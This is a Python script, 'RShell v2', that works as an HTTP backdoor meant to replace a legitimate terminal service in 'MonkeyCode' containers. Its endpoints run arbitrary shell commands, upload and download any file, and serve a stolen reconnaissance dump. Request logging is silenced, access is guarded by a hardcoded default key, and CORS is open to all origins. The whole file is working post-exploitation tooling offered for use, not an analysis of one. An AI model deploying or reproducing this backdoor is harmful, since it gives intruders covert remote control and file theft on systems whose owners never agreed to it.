#!/usr/bin/env python3
"""RShell v2 - Embedded HTTP reverse shell for MonkeyCode containers.
Runs on port 3002, replaces webterm-fm. Auth via X-Auth header.
Endpoints: POST /cmd, POST /upload, GET /download, GET /ping, GET /recon"""
import subprocess, json, os, sys, tempfile
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse, parse_qs

AUTH_KEY = os.environ.get('RSHELL_AUTH', 'sctplpe2024')
MAX_CMD_TIMEOUT = int(os.environ.get('RSHELL_TIMEOUT', '120'))
MAX_UPLOAD_SIZE = 50 * 1024 * 1024  # 50MB

def check_auth(headers, qs):
    return headers.get('X-Auth', qs.get('auth', [''])[0]) == AUTH_KEY

class RShellHandler(BaseHTTPRequestHandler):
    def log_message(self, fmt, *args):
        pass  # Silent logging

    def send_json(self, data, code=200):
        body = json.dumps(data, ensure_ascii=False).encode()
        self.send_response(code)
        self.send_header('Content-Type', 'application/json')
        self.send_header('Content-Length', str(len(body)))
        self.send_header('Access-Control-Allow-Origin', '*')
        self.end_headers()
        self.wfile.write(body)

    def do_OPTIONS(self):
        self.send_response(204)
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Access-Control-Allow-Methods', 'GET,POST,OPTIONS')
        self.send_header('Access-Control-Allow-Headers', 'Content-Type,X-Auth')
        self.end_headers()

    def do_GET(self):
        qs = parse_qs(urlparse(self.path).query)
        if not check_auth(self.headers, qs):
            return self.send_json({'error': 'unauthorized'}, 401)
        path = urlparse(self.path).path
        if path == '/ping':
            self.send_json({'ok': True, 'hostname': os.uname().nodename, 'kernel': os.uname().release})
        elif path == '/recon':
            try:
                with open('/tmp/recon.json') as f:
                    self.send_json(json.load(f))
            except:
                self.send_json({'error': 'recon not ready yet'}, 404)
        elif path == '/download':
            fpath = qs.get('path', [''])[0]
            if not fpath or not os.path.isfile(fpath):
                return self.send_json({'error': 'file not found'}, 404)
            with open(fpath, 'rb') as f:
                data = f.read()
            self.send_response(200)
            self.send_header('Content-Type', 'application/octet-stream')
            self.send_header('Content-Length', str(len(data)))
            self.send_header('Access-Control-Allow-Origin', '*')
            self.end_headers()
            self.wfile.write(data)
        else:
            self.send_json({'error': 'not found'}, 404)

    def do_POST(self):
        qs = parse_qs(urlparse(self.path).query)
        if not check_auth(self.headers, qs):
            return self.send_json({'error': 'unauthorized'}, 401)
        path = urlparse(self.path).path

        if path == '/cmd':
            try:
                body = json.loads(self.rfile.read(int(self.headers.get('Content-Length', 0))))
            except:
                return self.send_json({'error': 'invalid json'}, 400)
            cmd = body.get('cmd', '')
            if not cmd:
                return self.send_json({'error': 'no cmd'}, 400)
            try:
                r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=MAX_CMD_TIMEOUT)
                self.send_json({'stdout': r.stdout[-500000:] if len(r.stdout) > 500000 else r.stdout,
                               'stderr': r.stderr[-100000:] if len(r.stderr) > 100000 else r.stderr,
                               'rc': r.returncode})
            except subprocess.TimeoutExpired:
                self.send_json({'error': 'timeout', 'rc': -1})
            except Exception as e:
                self.send_json({'error': str(e), 'rc': -1})

        elif path == '/upload':
            fpath = qs.get('path', ['/tmp/uploaded'])[0]
            length = int(self.headers.get('Content-Length', 0))
            if length > MAX_UPLOAD_SIZE:
                return self.send_json({'error': 'too large'}, 413)
            data = self.rfile.read(length)
            os.makedirs(os.path.dirname(fpath) or '/tmp', exist_ok=True)
            with open(fpath, 'wb') as f:
                f.write(data)
            self.send_json({'ok': True, 'bytes': len(data), 'path': fpath})
        else:
            self.send_json({'error': 'not found'}, 404)

if __name__ == '__main__':
    port = int(sys.argv[1]) if len(sys.argv) > 1 else 3002
    srv = HTTPServer(('0.0.0.0', port), RShellHandler)
    print(f'RShell v2 listening on {port}', flush=True)
    srv.serve_forever()